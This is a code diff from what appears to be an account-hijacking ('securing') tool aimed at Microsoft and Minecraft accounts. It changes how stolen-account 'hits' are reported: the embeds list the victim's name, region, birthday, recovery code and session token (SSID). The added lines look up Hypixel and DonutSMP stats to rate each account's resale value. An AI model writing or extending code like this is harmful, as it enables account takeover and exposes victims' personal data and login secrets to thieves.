@@ -1,7 +1,8 @@
+from views.utils.minecraft.getHypixel import getHypixelStats
+from views.utils.minecraft.getDonut import getDonutStats
 from views.utils.securing.getLiveData import getLiveData
 from views.utils.securing.polishHost import polishHost
-from utils.minecraft.getHypixel import getHypixelStats
-from utils.minecraft.getDonut import getDonutStats
+from views.utils.minecraft.simplify import simplify
 from views.utils.securing.secure import secure
 from views.utils.getMSAAUTH import getMSAAUTH
 from urllib.parse import quote
@@ -42,6 +43,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
 
     name = quote(account["name"])
 
+    # Microsoft DOB Embed
     info_embed = Embed()
     info_embed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
     info_embed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
@@ -49,8 +51,19 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     info_embed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
     info_embed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
     
-    stats_embed = Embed()
+    hstats = await getHypixelStats(name)
+    dstats = await getDonutStats(name)
 
+    # Stats
+    stats_embed = Embed(color=0x279CF5)
+    stats_embed.add_field(name="Rank", value=f'{hstats["rank"]}', inline=True)
+    stats_embed.add_field(name="NWL", value=f'{simplify(hstats["networth"])}', inline=True)
+    stats_embed.add_field(name="Gifted", value=f'{hstats["gifted"]}', inline=True)
+    stats_embed.add_field(name="Value", value=f'${simplify(dstats["result"]["money"])}', inline=True)
+    stats_embed.add_field(name="NW", value=f'{simplify(hstats["hlevel"])}', inline=True)
+    stats_embed.add_field(name="LVL", value=f'{hstats["slevel"]}', inline=True)
+
+    # Account Embed
     hit_embed = Embed(
         title = f"New Hit! Secured in {round(finalTime, 2)}s",
         description = f"[Login](https://login.live.com/) | [Donut](https://www.donutstats.net/player-finder) | [SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | [Plancke](https://plancke.io/hypixel/player/stats/{name}) | [Is Online](https://hypixel.paniek.de/player/{name}/status)",
@@ -66,12 +79,13 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     hit_embed.add_field(name="Recovery Code", value=f"```{account['recovery_code']}```", inline=False)
     hit_embed.set_footer(text = f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
 
+    # Minecraft SSID Embed
     ssid_embed = Embed(
         title = "SSID",
         description = f"```{account['SSID']}```"
     )
     
-    if account["method"] != "No Minecraft":
+    if account["SSID"]:
         mcEmbed = Embed()        
         hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(account['name'])}/128")
 
